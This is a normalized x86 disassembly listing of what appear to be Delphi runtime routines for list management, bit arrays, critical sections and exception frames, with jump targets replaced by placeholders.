mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_418aa4
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp esi edi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41893c
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebx
call sub_4189b0
mov ebp eax
mov eax [ ebx + 0x4 ]
xor edx edx
mov [ eax + edi * 4 ] edx
mov edx edi
mov eax ebx
call sub_4188a0
xor ecx ecx
mov edx esi
mov eax ebx
call sub_418a2c
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] ebp
sub_418afc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41893c
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_418b4c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_418a0c
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4188a0
sub_418b6c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41893c
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_40272c
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_418ba8
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41893c
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_418b6c
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402cc4
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_4188a0
dec ebp
inc edi
jne r-xdata
sub_418c1c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403280
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_418c70
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403664
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_418d74
xor eax eax
push ebp
push sub_418cd2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4032b0
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_4032a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418cd9
mov eax [ ebp - 0x4 ]
call sub_418dd8
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_418cec
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_418d74
xor eax eax
push ebp
push sub_418d68
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418854
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418a0c
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418d6f
mov eax [ ebp - 0x4 ]
call sub_418dd8
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_41893c
sub_418d88
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_418d74
xor eax eax
push ebp
push sub_418dcb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418b4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418dd2
mov eax [ ebp - 0x4 ]
call sub_418dd8
retn
sub_418de4
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_418e38
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_418e38
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_418e14
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_4026ec
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402cc4
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_40270c
mov edx edi
mov eax ebp
call sub_418e2c
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4028e8
sub_418edc
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_418e14
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_418e38
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_418f08
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_418f80
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax esi
call sub_41befc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_418fc0
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_419076
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404144
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_403200
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404310
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_403200
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbd4
call sub_403a64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41907d
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_41909c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_419131
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_403200
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_404310
mov eax ebx
mov si 0xffff
call sub_4034ac
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419138
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov eax ebx
mov si 0xffff
call sub_4034ac
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_4034ac
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_40442c
sub_419143
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4034ec
mov eax ebx
mov si 0xffff
call sub_4034ac
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_4034ac
push eax
lea eax [ ebx + 0x4 ]
call sub_405944
mov ecx eax
mov edx r-xdata
pop eax
call sub_403364
sub_4191a0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_4191c0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_4191e0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403364
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_419208
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax edi
call sub_405944
test ebx ebx
je r-xdata
xor eax eax
mov [ edi ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
mov si 0xffff
call sub_4034ac
mov esi eax
test esi esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax edi
call sub_405944
mov edx eax
mov eax esi
call sub_419208
test [ ebx + 0x1c ] 0x10
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax edi
call sub_405944
push eax
push r-xdata
push ebx
mov eax [ ebx ]
call [ eax + 0x28 ]
jmp r-xdata
sub_4192a0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_4192f5
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_405944
mov edx eax
mov eax edi
call sub_419208
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4192fc
lea eax [ ebp - 0x4 ]
call sub_405944
retn
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_419304
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx ecx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_41933c
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418f80
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_41936c
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
cmp [ esi + 0xc ] 0x0
jne r-xdata
test dl dl
je r-xdata
mov edx eax
xor edx edx
jmp r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_4193a8
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_403200
mov edx esp
mov eax esi
call sub_404310
add esp 0x100
pop esi
pop ebx
retn
sub_4193d0
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_419465
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x114 ]
mov eax [ ebx ]
call sub_403200
lea edx [ ebp - 0x114 ]
mov eax edi
call sub_404310
push edi
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x4 ]
mov si 0xfffe
call sub_4034ac
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov eax ebx
call sub_419390
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408fe4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41946c
lea eax [ ebp - 0x14 ]
call sub_4040ac
retn
sub_419483
add [ ebx + 0x53c30440 ] cl
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_4199a4
mov edx ebx
mov eax esi
call sub_41993c
sub_4194b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_419390
test eax eax
jl r-xdata
pop esi
pop ebx
retn
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
mov ecx esi
xchg edx eax
call sub_418aa4
mov dl 0x1
mov eax ebx
call sub_41936c
sub_4194e8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ esi + 0x8 ] eax
xor ecx ecx
mov edx esi
mov eax esi
call sub_4192a0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_419534
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov [ esi + 0xc ] 0x1
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov cl 0x1
mov edx esi
mov eax esi
call sub_4192a0
mov eax [ esi + 0x8 ]
call sub_4032b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418f80
test bl bl
jle r-xdata
mov eax esi
call sub_41964c
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_419580
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_4195a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_418fac
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41961e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41964c
mov eax esi
call sub_419720
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
inc ebx
xor edi edi
mov edx edi
mov eax esi
call sub_419728
push eax
mov eax [ ebp - 0x4 ]
call sub_419580
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc edi
dec ebx
jne r-xdata
sub_41964c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_4196a6
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_418a98
call sub_4032b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_4196c0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx esi
call sub_4189b0
cmp ebp [ eax + 0x8 ]
je r-xdata
sub_419700
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419728
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_41973c
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4197ea
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebx ]
call sub_403200
lea edx [ ebp - 0x108 ]
mov eax edi
call sub_404310
mov eax ebx
mov si 0xffff
call sub_4034ac
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4197f1
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040d0
retn
mov eax ebx
mov si 0xffff
call sub_4034ac
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_4034ac
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_419804
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
mov eax edi
mov edx 0x3
call sub_40442c
sub_419804
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
call sub_404100
mov eax [ ebp - 0x4 ]
mov si 0xffff
call sub_4034ac
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4034d8
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4034d8
call sub_414ba0
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
movsx eax [ ebx + 0x8 ]
shl eax 0x2
call sub_4026ec
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_419901
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4034d8
mov edx [ ebp - 0xc ]
call sub_414da4
movsx edi [ ebx + 0x8 ]
dec edi
test edi edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40270c
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + ebx * 4 ]
mov eax [ ebp - 0x10 ]
call sub_414e28
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov esi [ eax + ebx * 4 ]
mov eax [ esi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x14
lea edx [ esi + 0x1a ]
call sub_404310
sub_419920
push ebx
push esi
mov esi edx
call sub_419580
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax ebx
pop esi
pop ebx
retn
sub_41993c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_40343c
test al al
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_418854
mov [ esi + 0x4 ] ebx
mov eax [ ebx + 0x10 ]
mov [ esi + 0x8 ] eax
inc [ ebx + 0x10 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor ecx ecx
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax ebx
call sub_41963c
xor ecx ecx
mov edx esi
mov eax ebx
call sub_4192a0
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_41893c
sub_4199a4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov cl 0x1
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax [ ebx + 0x8 ]
call sub_418a98
cmp esi eax
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_418b4c
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_4188a0
jmp r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
mov cl 0x1
mov edx esi
mov eax ebx
call sub_4192a0
mov eax ebx
call sub_41963c
pop edi
pop esi
pop ebx
retn
sub_419a00
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4189b0
mov edx eax
mov cl 0x2
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4189b0
call sub_4032b0
pop edi
pop esi
pop ebx
retn
sub_419a44
push ecx
mov [ esp ] edx
sub cl 0x1
jb r-xdata
mov edx esp
mov ecx [ eax ]
call [ ecx + 0xc ]
pop edx
retn
dec cl
je r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
pop edx
retn
sub_419a68
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x18 ] ecx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_4194e8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_419ab0
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a608
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418f80
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_419ae0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_419b04
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_419b28
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419bcf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419c78
xor eax eax
push ebp
push sub_419bb2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419bb9
mov eax [ ebp - 0x4 ]
call sub_419d34
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_419be0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418fac
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_419c78
xor eax eax
push ebp
push sub_419c60
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_419d34
retn
sub_419c90
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_419d48
mov ebx eax
xor bl 0x1
